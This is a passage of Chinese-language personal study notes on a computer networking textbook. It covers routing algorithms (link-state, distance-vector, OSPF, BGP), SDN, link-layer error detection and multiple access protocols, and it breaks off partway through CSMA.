<li><p><strong>交换结构</strong>。经过交换结构，分组才能从一个输入端口交换到一个输出端口。交换结构可以用多种形式，分别是 经内存交换、经总线交换、经互联网络交换（纵横式），如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/24.png" alt="pic"></p>
</li>
<li><p><strong>输出端口</strong>。将队列中的分组发送到输出链路上。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/25.png" alt="pic"></p>
</li>
<li><p><strong>路由选择器</strong>。路由选择算法运行之处（后面会详细讲解路由选择算法）。</p>
</li>
</ul>
<h2 id="4-路由选择算法"><a href="#4-路由选择算法" class="headerlink" title="4. 路由选择算法"></a>4. 路由选择算法</h2><p><strong>路由选择算法</strong>，其目的是从发送方到接收方的网络中，选择一条<strong>最短路径</strong>（即网络最好最快的一条路）。</p>
<p>究其本质，就是<strong>图的最短路径</strong>问题。而解决该问题的经典算法，想必读者在数据结构或算法课上都学过，即<strong>Dijkstra</strong>、<strong>Bellman-Ford</strong>和<strong>Floyd</strong>等。</p>
<p>根据路由选择算法的差异，有不同的分类。接下来将介绍几种分类，第一种常用分类：</p>
<ul>
<li><strong>集中式路由选择算法（centralized routing algorithm）</strong>，用完整的、全局性的网络信息计算出最短路径，也常被称作<strong>链路状态（ link-state，LS）</strong>算法。</li>
<li><strong>分散式路由选择算法（decentralized routing algorithm）</strong>，以迭代、分布式的方式计算出最短路径，也常被称作<strong>距离向量（distance-vector，DV）</strong>算法。</li>
</ul>
<p>第二种广义分类：静态路由选择算法；动态路由选择算法。第三种分类：负载敏感算法；负载迟钝算法。</p>
<h3 id="4-1-链路状态路由选择算法"><a href="#4-1-链路状态路由选择算法" class="headerlink" title="4.1. 链路状态路由选择算法"></a>4.1. 链路状态路由选择算法</h3><p>链路状态路由选择算法中，网络拓扑和所有链路开销情况都是已知的，都作为 LS 算法的输入。实践中，这些信息是让每个节点向网络中其它节点广播<strong>链路状态分组</strong>来完成的，分组中包含它所连接链路的标识和开销等信息。</p>
<p>LS 算法的本质其实是大名鼎鼎的 <strong>Dijkstra 算法</strong>。在我另一篇文章 <a href="./%E5%9B%BE%E7%9A%84%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E7%AE%97%E6%B3%95.html">图的最短路径算法</a> 中，我已经详细介绍了 Dijkstra 算法的过程，在此就不再赘述了。</p>
<p>LS 算法运行过程示例如下。其中，$D(v)$ 表示到本次迭代，从源节点到 $v$ 节点的最短路径的开销；$p(v)$ 表示最短路径中 $v$ 的前一个节点：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/31.png" alt="pic"><br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/32.png" alt="pic"></p>
<p>Dijkstra 算法的时间复杂度为 $O(n^2)$，相对较优，但也存在着一些<strong>问题</strong>：实践中，<strong>链路开销是非对称的</strong>，也就是 u 点到 v 点的开销与 v 点 u 点的开销是不相同的。同时，<strong>链路开销也是会变化的</strong>。当多个路由选择同一个时针方向时，该方向上的开销就会非常大，但反方向的开销相对较小；此时，多个路由可能同时改成反方向，而如此反方向开销剧增，正方向剧降；并进入反复横跳的循环中。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/26.png" alt="pic"></p>
<p>这种现象被称为<strong>振荡</strong>。有一种解决方法是：确保所有路由器<strong>不同时</strong>运行 LS 算法。</p>
<h3 id="4-2-距离向量路由选择算法"><a href="#4-2-距离向量路由选择算法" class="headerlink" title="4.2. 距离向量路由选择算法"></a>4.2. 距离向量路由选择算法</h3><p>DV 算法是一种迭代、分布式的算法。它的本质是 <strong>Bellman-Ford</strong> 算法，即：</p>
<p>$d(x,y) &#x3D; min{c(x,v) + d(v,y)}$<br>$v \in x所有的邻接点，c(x,v) 是 x 到 v 边的开销$</p>
<p><strong>DV 算法实际运行过程如下</strong>：</p>
<ol>
<li><p>每个节点（节点&#x3D;路由器） $x$ 需要维护一些路由信息：</p>
<ul>
<li>对于每个邻居 $v$，从 $x$ 直接到邻居 $v$ 的开销为 $c(x,v)$</li>
<li>节点 $x$ 的距离向量集，即 ${D_x(y) | y \in N}$，包含 $x$ 到 $N$ 中任意其它节点 $y$ 的最小开销估计值（最短路径）。</li>
<li>同时，会记录选择某条最短路径时的下一跳节点 $v$，即 $c(x,v) + d(v,y)$ 最小时的 $v$ 。</li>
</ul>
</li>
<li><p>每个节点还需不时地向它的每个邻居发送它的距离向量。当节点 $x$ 从它的任何一个邻居 $v$ 接收到新的距离向量时，它将保持 $v$ 的距离向量，然后使用 $d(x,y) &#x3D; min{c(x,v) + d(v,y)}$ 方程更新自己的距离向量。</p>
</li>
<li><p>如果节点 $x$ 的距离向量因步骤2而更新，那么它会向所有邻居发送它更新后的距离向量。</p>
</li>
</ol>
<p>示例如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/27.png" alt="pic"></p>
<p>注意在第2列中，$y$ 节点的距离向量没有更新，因此节点 $y$ 没有发送更新。</p>
<p>现在，我们需要考虑一些特殊情况：<strong>链路开销改变与链路故障</strong>。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/29.png" alt="pic"></p>
<p>当链路开销减小时：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/28.png" alt="pic"></p>
<p>当链路开销增加时：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/30.png" alt="pic"></p>
<p>从上述过程，我们可以看出：该循环将持续44次迭代（在 $y$ 与 $z$ 之间），直到 $z$ 算出它经由 $y$ 的路径开销大于50。这个问题被称为<strong>无穷计数问题</strong>。</p>
<p>一种<strong>毒性逆转</strong>的方法可用于解决该问题，但并不具有一般性。</p>
<h3 id="4-3-LS-与-DV-的比较与应用"><a href="#4-3-LS-与-DV-的比较与应用" class="headerlink" title="4.3. LS 与 DV 的比较与应用"></a>4.3. LS 与 DV 的比较与应用</h3><p>设 $N$ 是节点集，$E$ 是链路集。比较：</p>
<ul>
<li><p>传播开销。当链路开销改变时，LS 必须向所有节点广播新的链路开销，需要发送 $O(|N||E|)$；而 DV 只需向邻近节点传播。</p>
</li>
<li><p>收敛（得到正确结果）速度。LS 算法为 $O(n^2)$ ；而 DV 算法收敛较慢，且会遇到<strong>路由选择环路</strong>等问题。</p>
</li>
<li><p>健壮性。如果遇到出现故障的链路，LS 能够向所有节点广播不正常的开销；而 DV 可能把不正常的计算值扩散到整个网络。</p>
</li>
</ul>
<p>LS 算法的应用：<strong>OSPF</strong>等。</p>
<p>DV 算法的应用：<strong>RIP</strong>、<strong>BGP</strong>等。</p>
<h3 id="4-4-自治系统内部的路由选择：OSPF"><a href="#4-4-自治系统内部的路由选择：OSPF" class="headerlink" title="4.4. 自治系统内部的路由选择：OSPF"></a>4.4. 自治系统内部的路由选择：OSPF</h3><p>到目前为止的路由选择算法中，我们都将网络看作一个互联网路由器的集合，从所有路由器上执行相同的路由选择算法以计算穿过整个网络的最短路径。但是，实践中却并非如此简单，有如下原因：</p>
<ul>
<li><strong>规模</strong>。当今互联网由数亿台路由器和主机组成，在如此大的网络中运行路由选择算法，可能永远都无法收敛。而且储存网络信息将需要巨大容量。</li>
<li><strong>管理自治</strong>。第一章提到，互联网是 ISP 的网络，每个 ISP 都有自己的路由器网络，它们希望按照自己意愿运行路由器，也希望对外部<strong>隐藏</strong>其网络的内部细节。</li>
</ul>
<p>于是乎，出现了 <strong>自治系统（autonomous system, AS）</strong>。每个 AS 是一个路由器集合，并对所属路由器使用相同的方法进行管理控制。ISP 通常将他们的网络划分成一到多个 AS。而在一个 AS 中运行的路由选择算法叫作<strong>自治系统内部路由选择协议（intra-autonomous system routing protocol）</strong>。</p>
<p>自治系统内部路由选择协议有很多，如：基于 LS 算法的 OSPF 协议、基于 DV 算法的 RIP 协议等。其中，<strong>开放最短路优先 OSPF [RFC 2328]</strong> 更为常用。</p>
<p>除了拥有 LS 算法的特性，OSPF 协议还有以下优点：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/33.png" alt="pic"></p>
<h3 id="4-5-自治系统间的路由选择：BGP"><a href="#4-5-自治系统间的路由选择：BGP" class="headerlink" title="4.5. 自治系统间的路由选择：BGP"></a>4.5. 自治系统间的路由选择：BGP</h3><p>OSPF 可以解决自治系统内部的路由问题，但当一个分组需要跨越多个 AS 时，我们则需要 <strong>自治系统间路由选择协议（inter-autonomous system routing protocol）</strong>。</p>
<p>由于 AS 间路由选择协议涉及多个 AS 之间的协调，所以 AS 间必须运行相同的协议，即 **边界网关协议 BGP [RFC 4271]**。</p>
<p>BGP 协议有如下特性：</p>
<ol>
<li><p>在 BGP 中，分组并不是路由到一个特定 IP 地址，而是路由到 CIDR 的前缀，也就是<strong>一个子网或子网的集合</strong>。所以，路由器的 BGP 路由表表项通常为 <code>(x, l)</code> 的形式，其中 <code>x</code> 是一个前缀（如138.16.68&#x2F;22），<code>l</code> 是该路由器的输出接口之一。</p>
</li>
<li><p>与 DV 算法类似，在 BGP 中，路由器会向临近路由器传递路由信息。但不同的是，<strong>BGP 路由算法并不一定选择开销最小的路径，而是会选择“最佳”的路径</strong>。</p>
</li>
</ol>
<p>在介绍 BGP 独特的路由选择算法之前，我们还需要了解一些 BGP 相关内容：</p>
<ul>
<li><p><strong>网关路由器</strong>。位于 AS 边缘，并连接到其它 AS 的路由器，被称为网关路由器。反之，则被称为内部路由器。如下图的 AS1 中，1c、1d 是网关路由器，1a、1b 则是内部路由器。</p>
</li>
<li><p><strong>BGP 属性</strong>。在 BGP 中，当路由器向临近路由器传递信息时，除了包含前缀，还包括一些 BGP 属性。其中，两个比较重要的属性是 <strong>AS-PATH</strong>（表示到达目的前缀&#x2F;子网所经过的 AS 路径，如下图中，从 <code>AS1</code> 到子网 <code>x</code> 有两条路，AS-PATH 分别是 “AS2 AS3”、“AS3”）和 <strong>NEXT-HOP</strong>（表示 AS-PATH 中第一个路由器的输入接口 IP 地址，如下图中，对于从 <code>AS1</code> 到子网 <code>x</code> 的路径 “AS2 AS3”，其 NEXT-HOP 值为路由器 2a 左边接口的 IP 地址）。</p>
</li>
<li><p><strong>BGP 路由</strong>。包含前缀及其属性的路由信息，被称为 BGP 路由。实践中，一条 BGP 路由还包括其他属性，此处我们暂时忽略。</p>
</li>
</ul>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/34.png" alt="pic"></p>
<p>接下来，将介绍 BGP 的路由选择算法。考虑的情况是：从路由器 <code>1b</code> 路由到子网 <code>x</code>，显然有两条路径：经过网关路由器 1c 到达 AS2 再到达 AS3、经过网关路由器 1d 直接到达 AS3。</p>
<ul>
<li><p><strong>热土豆路由选择算法</strong>。假设开销为经过的链路数，第一条路径的总开销肯定大于第二条路径。但根据热土豆算法，由于 1b 到 1c 的开销小于 1b 到 1d 的开销，算法会选择第一条路径。热土豆算法的思想是：尽可能地将分组送出其 AS ，而不担心送出来后的剩余开销。可以说，这是一个<strong>自私的算法</strong>。</p>
</li>
<li><p><strong>真实的 BGP 路由选择算法</strong>。如果有多条路径，则按照如下规则顺序进行筛选，直到选出最好的路径：<br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/35.png" alt="pic"><br>由于第二条规则在第三条规则之前，所以 BGP 路由选择算法并不是一个自私的算法。<br>有关第一条规则中的 BGP 策略问题，书中也未作详细讲解，可以自行了解。</p>
</li>
</ul>
<p>除了用于 AS 间的路由选择，BGP 还常用于实现 **IP 任播 [RFC 1546, RFC 7094]**。从 BGP 路由选择算法中，我们得知：当目的地相同时，算法会从多条路径中选择“最佳”的（比如 AS-PATH 最短）。</p>
<p>BGP 任播应用：</p>
<ul>
<li><p>CDN 内容分发网络。CDN 公司会为它的多台服务器配置相同的 IP 地址，当客户访问视频等内容时，利用 BGP 路由选择算法的特点，算法会向“最近的”服务器转发请求，从而让用户得到更好的体验。但实践中 CDN 通常不使用 IP 任播，因为 BGP 路由选择算法可能会导致同一个 TCP 连接的不同分组到达不同的服务器。</p>
</li>
<li><p>DNS 系统。IP 任播被广泛地用于 DNS 系统，它会将 DNS 请求指向最近的 DNS 服务器（比如13个根服务器中的一个）。</p>
</li>
</ul>
<p>BGP 在因特网中起着重要作用，以上只是 BGP 的简要介绍。</p>
<h3 id="4-6-AS-内部和-AS-间路由选择协议的比较"><a href="#4-6-AS-内部和-AS-间路由选择协议的比较" class="headerlink" title="4.6. AS 内部和 AS 间路由选择协议的比较"></a>4.6. AS 内部和 AS 间路由选择协议的比较</h3><p><strong>AS 间路由选择是面向策略的</strong>。不同 AS 可能是由不同的 ISP 管理的，而它们之间可能是竞争关系，或者说 ISP 都是自私的，比如：一个 AS 产生的流量不能经过另一个特定的 AS 、一个 AS 并不想承载其它 AS 的流量。</p>
<p>而，<strong>AS 内部路由选择是面向性能</strong>。AS 内部是由同一个 ISP 统一管理的，所以上述策略相对不重要，而性能才是关键。</p>
<h2 id="5-软件定义网络-SDN"><a href="#5-软件定义网络-SDN" class="headerlink" title="5. 软件定义网络 SDN"></a>5. 软件定义网络 SDN</h2><p><strong>软件定义网络（Software Defined Network，SDN）</strong>，是近年来（201x）兴起的一种网络管理方法。它的提出类似于操作系统的思想，将底层网络设备进行抽象，屏蔽其具体细节，同时为上层提供相关接口。用户通过这些接口，可以开发各种软件，对网络进行集中式管理、灵活配置、自动化监控、访问控制、负载均衡等等操作。</p>
<p>书上提到，SDN 体系具有4个特征：</p>
<ul>
<li><p><strong>基于流的转发</strong>。SDN 控制的分组转发，能够基于运输层、网络层、链路层首部中的任意字段；而传统转发仅依据数据报的目的 IP 地址进行。</p>
</li>
<li><p><strong>数据平面与控制平面分离</strong>。数据平面由路由器等网络设备组成，它们会根据流表执行“匹配加动作”的规则；控制平面由服务器、以及决定和管理流表的软件组成。</p>
</li>
<li><p><strong>网络控制功能</strong>。与传统的路由器不同，算法软件在服务器上执行，服务器与网络设备截然分开并与之远离。如下图所示，控制平面由两部分组成：<strong>SDN 控制器</strong> 和 <strong>若干网络控制程序</strong>。SDN 控制器负责维护获取网络状态信息，并向上层提供；网络控制程序则以此监视、控制网络设备。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC4-5%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%82/36.png" alt="pic"></p>
</li>
<li><p><strong>可编程网络</strong>。通过控制平面中的网络控制应用程序，SDN 控制平面即拥有了“智力”，例如：它可以决定源与目的间的路径、可以对特定分组进行阻挡、可以根据负载均衡对分组进行转发、甚至可以运行 AI 算法。</p>
</li>
</ul>
<p>SDN 是当下的一股热潮。其中，相对突出的是 <strong>OpenFlow 协议</strong>，它运行在 SDN 控制器和网络设备上。但在此不做详细介绍。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>《计算机网络》笔记-第6章链路层和局域网</title>
    <url>/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>通过网络层，我们知道网络如何选择最优路径，将分组从一个主机发送到另一个主机。</p>
<p>而通过链路层，我们将知道：<strong>分组是如何在构成端到端最优路径的各段物理链路上进行传输的</strong>。</p>
<p>同样类比物流寄件，如果说网络层解决的是：将邮件从一个地址邮寄到另一个地址；那么链路层解决的就是：将邮件从一个节点交付给下一个节点，是采用卡车、还是飞机、还是轮船呢。</p>
<span id="more"></span>

<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>在链路层中，任何设备将称作<strong>节点（node）</strong>，包括主机、路由器、交换机等。</p>
<p>连接相邻节点的通信信道则称为<strong>链路（link）</strong>。</p>
<p>链路层传输的分组称为<strong>帧（frame）</strong>。</p>
<p>在链路层的讨论中，将介绍两种不同类型的链路层通信：</p>
<ul>
<li><strong>广播信道</strong>。它用于连接有线局域网、卫星网中的多台主机等。</li>
<li><strong>点对点信道</strong>。它用于长距离链路连接的两台路由器之间等。</li>
</ul>
<p>链路层协议所提供的服务包括：</p>
<ul>
<li><strong>成帧</strong>。将网络层数据封装进链路层分组——帧中。</li>
<li>链路接入。<strong>媒体访问控制（Medium Access Control，MAC）协议</strong>规定了帧在链路上传输的规则。<strong>根据信道的不同，MAC 协议可分为点对点协议和多路访问协议两大类</strong>。在点对点信道上，MAC 协议比较简单；而在广播信道上，MAC 协议比较复杂。</li>
<li>可靠交付。有些高差错率的链路会提供可靠交付服务，但大部分都不提供。</li>
<li>差错检测和纠正。</li>
</ul>
<p>链路层主体部分在<strong>网络适配器&#x2F;网络接口卡&#x2F;网卡（Network adapter）</strong>中实现，网卡的核心是一个实现了大部分链路层服务的芯片——链路层控制器（Controller）。剩余小部分链路层功能在 CPU 中实现。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/2.png" alt="pic"></p>
<h2 id="2-差错检测和纠正技术"><a href="#2-差错检测和纠正技术" class="headerlink" title="2. 差错检测和纠正技术"></a>2. 差错检测和纠正技术</h2><p>上文提到，对链路层帧中的比特差错进行检测和纠正，是链路层提供的服务之一。接下来，将介绍3种差错检测技术：</p>
<ul>
<li>奇偶校验</li>
<li>校验和方法</li>
<li>循环冗余检测</li>
</ul>
<h3 id="2-1-奇偶校验"><a href="#2-1-奇偶校验" class="headerlink" title="2.1. 奇偶校验"></a>2.1. 奇偶校验</h3><p>最简单的奇偶校验即使用单个<strong>奇偶校验位（parity bit）</strong>。假设发送 <code>d</code> 比特的信息，在<strong>偶校验</strong>方案中，发送方只需附加一个比特，使得这 <code>d+1</code> 比特中 <code>1</code> 的总数是偶数。奇校验则使 <code>1</code> 的个数是奇数。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/3.png" alt="pic"></p>
<p>实践证明，单个奇偶校验位方案，检测出差错的概率为 50% 。</p>
<p><strong>二维奇偶校验</strong>是一种更强大的方案。发送数据的 <code>d</code> 个比特被划分为 <code>i</code> 行 <code>j</code> 列，对每行每列计算奇偶值，产生 <code>i+j+1</code> 个差错检测比特。它还能用来纠正出现差错的比特。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/4.png" alt="pic"></p>
<h3 id="2-2-校验和方法"><a href="#2-2-校验和方法" class="headerlink" title="2.2. 校验和方法"></a>2.2. 校验和方法</h3><p>与运输层校验和方法相同。</p>
<h3 id="2-3-循环冗余检测"><a href="#2-3-循环冗余检测" class="headerlink" title="2.3. 循环冗余检测"></a>2.3. 循环冗余检测</h3><p>当下使用最广泛的差错检测技术为<strong>循环冗余检测（cyclic redundancy check，CRC）编码</strong>，也被称为<strong>多项式编码</strong>。</p>
<p>其操作过程为：</p>
<ol>
<li>发送方和接收方事先协商一个 <code>r+1</code> 的比特串（最高位必须是1），称为<strong>生成多项式</strong>，我们将其表示为 <code>G</code>。</li>
<li>对于要发送的 <code>d</code> 字节数据 <code>D</code>，发送方要得出 <code>r</code> 个比特的附加比特串 <code>R</code> ，并附加到 <code>D</code> 右边，使得这个 <code>d+r</code> 个比特能被 <code>G</code> “整除”（除的过程中，加不进位、减不借位，等价于异或）。那如何得出 <code>R</code> 呢？示例：<code>D=101110, d=6, G=1001, r=3</code>，其计算过程如下，最后得到 <code>R</code> 为 <code>011</code>，<code>d+r</code> 个比特为 <code>101110 011</code>。<br>  <img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/5.png" alt="pic"></li>
<li>接收方接收到 <code>d+r</code> 个比特的数据后，会用 <code>G</code> 去除。如果余数非零，则表示出现差错；余数为零，则表示正确。</li>
</ol>
<h2 id="3-多路访问链路和协议"><a href="#3-多路访问链路和协议" class="headerlink" title="3. 多路访问链路和协议"></a>3. 多路访问链路和协议</h2><p>此前提到，有两种类型的链路：</p>
<ul>
<li><strong>点对点链路</strong>。由单个发送方和单个接收方组成，相关协议有：<strong>点对点协议（point-to-point protocol，PPP）</strong>、高级数据链路控制（high-level data link control，HDLC）。</li>
<li><strong>广播链路</strong>。当某节点发送数据时，它会以广播的方式发送，同一广播链路上的节点都能接收到。而当多个发送发同时发送数据时，数据会在链路中发生<strong>碰撞</strong>，以致数据被损坏。如以太网、无线局域网等都是广播链路。</li>
</ul>
<p>我们将主要讨论广播链路，而广播链路中最重要的问题即<strong>多路访问问题（multiple access problem）</strong>。什么是多路访问问题呢？举个例子：有许多人聚集在一个房间中讨论问题，每个人都能发言。但讨论时，有可能每个人都争抢着发言、互不礼让，导致场面混乱不堪。</p>
<p>而为了让讨论井然有序地进行，我们需要指定一些规则：</p>
<ul>
<li>每个人都有讲话的权力</li>
<li>不要一个人讲太久，导致其它人没有发言机会</li>
<li>想发言可以举手示意</li>
<li>不要贸然打断他人的讲话</li>
<li>当有人讲话时，不能睡觉</li>
</ul>
<p>这些规则同样适用于解决多路访问问题，这也就是<strong>多路访问协议（multiple access protocols）</strong>。</p>
<p>当下，有十几种多路访问协议，我们将其划分为 3 种类型：</p>
<ul>
<li><strong>信道划分协议（channel partitioning protocols）</strong></li>
<li><strong>随机接入协议（random access protocols）</strong></li>
<li><strong>轮流协议（taking-turns protocols）</strong></li>
</ul>
<h3 id="3-1-信道划分协议"><a href="#3-1-信道划分协议" class="headerlink" title="3.1. 信道划分协议"></a>3.1. 信道划分协议</h3><p>为了避免碰撞，我们可以将广播信道以不同的方式平均地分配给每个节点，这就是信道划分协议。</p>
<p>主要有三种信道划分方法：</p>
<ul>
<li><p><strong>时分多路复用（time-division multiplexing，TDM）</strong>。TDM 将时间划分为<strong>时间帧（time frame）</strong>，并进一步将每个时间帧划分成 N 个<strong>时隙（slot）</strong>，然后把 N 个时隙分配给 N 个节点。节点发送数据时，必须在指定时隙中传输比特。<br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/6.png" alt="pic"><br>其主要缺点为：节点速率被限制为 $R&#x2F;N bps$ （$R$ 为整个信道的速率），且必须等待它所属的时隙，即使它是唯一要发送的时隙。</p>
</li>
<li><p><strong>频分多路复用（frequency-division multiplexing，FDM）</strong>。将信道划分为不同的频段（每个频段具有 $R&#x2F;N$ 带宽），并把 N 个频段分配给 N 个节点。它也有着与 TDM 相同的缺点。<br><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/7.png" alt="pic"></p>
</li>
<li><p><strong>码分多址（code division multiple access，CDMA）</strong>。一种神奇的方法，目前已广泛地用于蜂窝电话中，我们将在之后详细讲解。</p>
</li>
</ul>
<h3 id="3-2-随机接入协议"><a href="#3-2-随机接入协议" class="headerlink" title="3.2. 随机接入协议"></a>3.2. 随机接入协议</h3><p>在随机接入协议中，节点总是以 $R$ 速率发送数据。当发生碰撞时，节点会在等待随机时间后重新发送，如此循环。</p>
<p>我们将主要介绍两种常用的随机接入协议：</p>
<ul>
<li><strong>ALOHA 协议</strong></li>
<li><strong>载波侦听多路访问协议（CSMA）</strong></li>
</ul>
<h4 id="3-2-1-时隙-ALOHA"><a href="#3-2-1-时隙-ALOHA" class="headerlink" title="3.2.1. 时隙 ALOHA"></a>3.2.1. 时隙 ALOHA</h4><p>时隙 ALOHA 结合了时分多路复用的方法，但进行了改进。</p>
<p>时隙 ALOHA 先进行了如下规定：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/8.png" alt="pic"></p>
<p>然后，其操作过程为：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/9.png" alt="pic"></p>
<p>与信道划分不同，当只有一个节点发送数据时，它可以独占整个信道，也就是能以 $R$ 速率发送数据。</p>
<p>但它的效率并不高。</p>
<p>分享一个历史小故事：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/10.png" alt="pic"></p>
<h4 id="3-2-2-载波侦听多路访问（CSMA）"><a href="#3-2-2-载波侦听多路访问（CSMA）" class="headerlink" title="3.2.2. 载波侦听多路访问（CSMA）"></a>3.2.2. 载波侦听多路访问（CSMA）</h4><p>CSMA 的关键在于 <strong>载波侦听（carrier sensing）</strong>，它的本质很简单：一个节点在传输前先听信道，如果没有数据在传输，则发送数据；反之，则等待直到检测到信道一段时间都没有数据传输，再开始传输。</p>
<p>但 CSMA 存在一个问题：当两个节点都监听到信道空闲时，它们会同时发送数据，最终导致数据碰撞。</p>
